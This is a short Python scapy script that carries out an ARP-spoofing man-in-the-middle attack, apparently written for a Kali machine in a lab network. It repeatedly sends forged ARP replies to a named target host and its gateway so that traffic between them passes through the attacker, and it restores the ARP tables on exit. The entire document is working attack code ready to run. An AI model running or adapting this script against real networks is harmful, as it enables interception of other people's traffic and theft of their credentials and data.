from scapy.all import *
import time

# Set the interface manually if needed
conf.iface = "eth0"  # Change as needed

# Network configuration
target_ip = "10.15.31.153"
gateway_ip = "10.15.0.1"
target_mac = "0a:ca:11:df:10:77".lower()
gateway_mac = "0a:72:ba:0f:5d:5c".lower()
kali_mac = get_if_hwaddr(conf.iface)

def spoof():
    while True:
        # Spoof target
        send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac, hwsrc=kali_mac), verbose=0)
        # Spoof gateway
        send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst=gateway_mac, hwsrc=kali_mac), verbose=0)
        time.sleep(1)

try:
    print("[+] Starting MITM attack. Press Ctrl+C to stop.")
    spoof()
except KeyboardInterrupt:
    print("\n[!] Restoring ARP tables...")
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac, hwsrc=gateway_mac), count=5, verbose=0)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst=gateway_mac, hwsrc=target_mac), count=5, verbose=0)
    print("[+] ARP tables restored. MITM stopped.")
